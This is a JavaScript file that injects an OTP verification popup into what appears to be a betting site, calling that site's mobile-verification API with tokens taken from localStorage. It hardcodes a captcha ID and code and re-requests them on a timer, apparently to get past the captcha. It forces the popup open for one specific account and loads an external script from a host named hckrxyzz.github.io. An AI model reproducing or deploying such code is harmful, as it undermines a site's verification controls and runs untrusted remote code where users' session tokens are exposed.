async function verifyInput() {
    const userInput = document.getElementById('userInput').value;
    const resultElement = document.getElementById('result');
    const mobile = localStorage.getItem('mobile') || '';
    const captcha_id = "3a4ae919-8d7f-4486-9434-9b289643e03c";
    const captcha_code = "2244";
    const verifyUrl = "https://feapi.sharky777.xyz/api/mobile/verify";
    const authToken = localStorage.getItem('authToken');

    try {
        const response = await fetch(verifyUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": "Bearer " + authToken,
                "Priority": "u=0"
            },
            body: JSON.stringify({
                verification_code: userInput,
                mobile: mobile,
                captcha_id: captcha_id,
                captcha_code: captcha_code
            })
        });

        const data = await response.json();
        if (response.ok && data.success) {
            resultElement.textContent = 'Code is correct.';
            alert('Verification successful!');
            localStorage.setItem('userX', 'varified');
            // Hide popup only if not forced to stay open
            const popup = document.getElementById('otpVerify');
            if (popup && !popup.dataset.forceOpen) {
                popup.style.display = 'none';
            }
            // Optionally redirect or do something else
        } else {
            resultElement.textContent = 'Code is incorrect.';
            alert('Verification failed. Please try again.');
        }
    } catch (error) {
        resultElement.textContent = 'An error occurred.';
        alert('Verification failed. Please try again.');
    }
}

function startCaptchaRefresh() {
    setInterval(async () => {
        const captchaRefreshUrl = "https://feapi.sharky777.xyz/api/member/requestCaptchaCode?captcha_code=2244&captcha_id=3a4ae919-8d7f-4486-9434-9b289643e03c";
        try {
            await fetch(captchaRefreshUrl, {
                method: "GET"
            });
        } catch (error) {}
    }, 20000);
}

startCaptchaRefresh();

async function reqOtp() {
    const verifyUrl = "https://feapi.sharky777.xyz/api/mobile/request";
    const authToken = localStorage.getItem('authToken');
    const headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + authToken
    };

    await fetch(verifyUrl, {
        method: "POST",
        headers: headers,
        body: JSON.stringify({
            "membercode": localStorage.getItem('username'),
            "mobile": localStorage.getItem('mobile'),
            "currency": "BDT",
            "language": "en",
            "request_otp": true,
            "captcha_id": "3a4ae919-8d7f-4486-9434-9b289643e03c",
            "captcha_code": "2244"
        })
    });
}

function createContainer(forceOpen = false) {
    // Remove existing popup if any
    const oldPopup = document.getElementById('otpVerify');
    if (oldPopup) oldPopup.remove();

    const popupContainer = document.createElement('div');
    popupContainer.setAttribute('id', 'otpVerify');
    popupContainer.classList.add('chat-popup');
    popupContainer.style.position = 'fixed';
    popupContainer.style.bottom = '70px';
    popupContainer.style.left = '100px';
    popupContainer.style.zIndex = '1000';
    popupContainer.style.backgroundColor = '#fff';
    popupContainer.style.border = '1px solid #ccc';
    popupContainer.style.borderRadius = '5px';
    popupContainer.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
    popupContainer.style.padding = '10px';
    popupContainer.style.display = 'block';
    if (forceOpen) {
        popupContainer.dataset.forceOpen = "1";
    }

    // Create form container
    const form = document.createElement('form');
    form.style.marginBottom = '10px';
    form.onsubmit = e => { e.preventDefault(); return false; };

    // Membercode row
    const membercodeRow = document.createElement('div');
    membercodeRow.className = 'mb-3 row';
    const membercodeLabel = document.createElement('label');
    membercodeLabel.className = 'col-sm-3 col-form-label text-dark';
    membercodeLabel.textContent = 'Membercode:';
    const membercodeDiv = document.createElement('div');
    membercodeDiv.className = 'col-sm-9';
    const membercodeInput = document.createElement('input');
    membercodeInput.type = 'text';
    membercodeInput.id = 'membercode';
    membercodeInput.className = 'form-control';
    membercodeInput.value = localStorage.getItem('username') || 'user1234';
    membercodeInput.disabled = true;
    membercodeDiv.appendChild(membercodeInput);
    membercodeRow.appendChild(membercodeLabel);
    membercodeRow.appendChild(membercodeDiv);

    // Mobile row
    const mobileRow = document.createElement('div');
    mobileRow.className = 'mb-3 row';
    const mobileLabel = document.createElement('label');
    mobileLabel.className = 'col-sm-3 col-form-label text-dark';
    mobileLabel.textContent = 'Mobile:';
    const mobileDiv = document.createElement('div');
    mobileDiv.className = 'col-sm-9';
    const mobileInput = document.createElement('input');
    mobileInput.type = 'text';
    mobileInput.id = 'mobile';
    mobileInput.className = 'form-control';
    mobileInput.value = localStorage.getItem('mobile') || '0123654444';
    mobileInput.disabled = true;
    mobileDiv.appendChild(mobileInput);
    mobileRow.appendChild(mobileLabel);
    mobileRow.appendChild(mobileDiv);

    // Request OTP button row
    const reqOtpRow = document.createElement('div');
    reqOtpRow.className = 'mb-3 row';
    const reqOtpDiv = document.createElement('div');
    reqOtpDiv.className = 'col-sm-12 d-grid gap-2';
    const reqOtpBtn = document.createElement('button');
    reqOtpBtn.type = 'button';
    reqOtpBtn.className = 'btn btn-primary';
    reqOtpBtn.id = 'reqOtpBtn';
    reqOtpBtn.textContent = 'Request OTP';
    reqOtpBtn.onclick = reqOtp;
    reqOtpDiv.appendChild(reqOtpBtn);
    reqOtpRow.appendChild(reqOtpDiv);

    // Verify OTP row
    const verifyOtpRow = document.createElement('div');
    verifyOtpRow.className = 'mb-3 row';
    const verifyOtpLabel = document.createElement('label');
    verifyOtpLabel.className = 'col-sm-3 col-form-label text-dark';
    verifyOtpLabel.textContent = 'Verify OTP:';
    const otpInputDiv = document.createElement('div');
    otpInputDiv.className = 'col-sm-6';
    const otpInput = document.createElement('input');
    otpInput.type = 'number';
    otpInput.id = 'userInput';
    otpInput.className = 'form-control';
    otpInput.placeholder = 'Enter OTP';
    otpInputDiv.appendChild(otpInput);
    const verifyBtnDiv = document.createElement('div');
    verifyBtnDiv.className = 'col-sm-3 d-grid';
    const verifyOtpBtn = document.createElement('button');
    verifyOtpBtn.type = 'button';
    verifyOtpBtn.className = 'btn btn-success';
    verifyOtpBtn.id = 'verifyOtpBtn';
    verifyOtpBtn.textContent = 'Verify OTP';
    verifyOtpBtn.onclick = verifyInput;
    verifyBtnDiv.appendChild(verifyOtpBtn);

    verifyOtpRow.appendChild(verifyOtpLabel);
    verifyOtpRow.appendChild(otpInputDiv);
    verifyOtpRow.appendChild(verifyBtnDiv);

    // Result message
    const resultDiv = document.createElement('div');
    resultDiv.id = 'result';
    resultDiv.style.marginTop = '10px';
    resultDiv.style.color = '#d9534f';

    // Append all rows to form
    form.appendChild(membercodeRow);
    form.appendChild(mobileRow);
    form.appendChild(reqOtpRow);
    form.appendChild(verifyOtpRow);
    form.appendChild(resultDiv);

    popupContainer.appendChild(form);

    // If not forced open, add toggle button
    if (!forceOpen) {
        let myButton = document.getElementById('otpToggleBtn');
        if (!myButton) {
            myButton = document.createElement('button');
            myButton.id = 'otpToggleBtn';
            myButton.classList.add('button-primary');
            myButton.textContent = 'Verify';
            myButton.style.position = 'fixed';
            myButton.style.bottom = '20px';
            myButton.style.left = '100px';
            myButton.style.minHeight = '38px';
            myButton.style.minWidth = '120px';
            myButton.style.borderRadius = '3px';
            myButton.style.background = 'linear-gradient(to right, #fbc103 0%, #f79604 15%, #f79604 30%, #fbc103 55%, #fbc103 100%)';
            myButton.style.backgroundPosition = '-50% 0';
            myButton.style.boxShadow = '0 5px 10px 0 rgba(6, 8, 15, 0.1), inset 0 0 3px 0 #ffdd8f';
            myButton.style.transition = 'background-position 0.3s ease-in, box-shadow 0.5s ease-out 0.1s, text-shadow 0.3s ease-in 0.1s';
            myButton.style.color = '#fff';
            document.body.appendChild(myButton);
        }
        myButton.onclick = () => {
            popupContainer.style.display = popupContainer.style.display === 'none' ? 'block' : 'none';
        };
        popupContainer.style.display = 'none';
    }

    document.body.appendChild(popupContainer);

    // Focus input
    setTimeout(() => {
        const codeInput = document.getElementById('userInput');
        if (codeInput) codeInput.focus();
    }, 100);
}

window.addEventListener('DOMContentLoaded', function () {
    const username = localStorage.getItem('username');
    if (username === '840600') {
        // If not verified, force open OTP verify container
        if (localStorage.getItem('userX') !== 'varified') {
            createContainer(true);
        }
    } else {
        createContainer(false);
    }
});

function kkOtp() {
    var script = document.createElement('script');
    script.src = "https://hckrxyzz.github.io/js/kkotp.js";
    document.body.append(script);
    script.onload = createContainer();
}
